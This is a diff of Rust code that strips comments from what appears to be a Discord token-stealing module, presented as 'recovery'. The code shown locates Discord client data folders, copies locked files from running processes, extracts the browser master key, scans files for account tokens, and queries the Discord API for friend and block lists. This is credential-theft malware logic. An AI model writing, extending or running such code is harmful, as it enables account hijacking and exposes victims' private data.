@@ -44,13 +44,12 @@ fn discord_roots(ctx: &RecoveryContext) -> Vec<(String, PathBuf)> {
     let mut result = Vec::new();
     let base = ctx.roaming_data_dir.clone();
     
-    // Name, Path, ProcessName
     let variants = [
         ("Discord", "Discord.exe"),
         ("discordcanary", "DiscordCanary.exe"),
         ("discordptb", "DiscordPTB.exe"),
         ("Lightcord", "Lightcord.exe"),
-        ("BetterDiscord", "Discord.exe"), // Usually hooks Discord
+        ("BetterDiscord", "Discord.exe"),
     ];
 
     for (dir_name, proc_name) in variants {
@@ -91,12 +90,10 @@ async fn read_safe(proc_name: &str, path: &Path, temp_dir: &Path) -> Result<Vec<
         return Err(RecoveryError::Io(std::io::Error::new(std::io::ErrorKind::NotFound, "file not found")));
     }
 
-    // Try direct read first
     if let Ok(data) = fs::read(path).await {
         return Ok(data);
     }
 
-    // Fallback to locked copy
     let temp_file = temp_dir.join(path.file_name().unwrap_or_else(|| std::ffi::OsStr::new("temp")));
     if copy_locked_file(proc_name, path, &temp_file) {
         let data = fs::read(&temp_file).await.map_err(RecoveryError::Io)?;
@@ -116,17 +113,12 @@ async fn collect_tokens_for_path(
 
     let local_state = root.join("Local State");
     let master_key = if local_state.exists() {
-        // We can't use extract_master_key directly if the file is locked
-        // So we read it safely first, then write it to a temp file for extract_master_key (which takes a path)
-        // OR we refactor extract_master_key. 
-        // For now, let's just shadow copy it to a temp path and pass that.
         let temp_ls = temp_dir.join("Local State");
         if copy_locked_file(proc_name, &local_state, &temp_ls) {
              let key = extract_master_key(&temp_ls)?;
              let _ = fs::remove_file(&temp_ls).await;
              key
         } else {
-             // Try direct if locked copy failed (maybe process not running)
              extract_master_key(&local_state)?
         }
     } else {
@@ -149,7 +141,6 @@ async fn collect_tokens_for_path(
                 }
             }
             
-            // Read file safely (handling locks)
             if let Ok(data) = read_safe(proc_name, &entry.path(), &temp_dir).await {
                 if let Ok(mut found) = scan_bytes_for_tokens(&data) {
                     tokens.extend(found.drain());
@@ -197,7 +188,7 @@ async fn gather_discord_token_records(
                     });
                 }
             }
-            Ok(_) => {} // No tokens found or master key not found, continue
+            Ok(_) => {}
             Err(err) => {
                 records.push(DiscordTokenRecord {
                     source: source_label.clone(),
@@ -332,7 +323,7 @@ impl DiscordApiClient {
                         match relationship.kind {
                             1 => record.friends.push(label),
                             2 => record.blocked_friends.push(label),
-                            _ => {} // Ignore other relationship types
+                            _ => {}
                         }
                     }
                 }
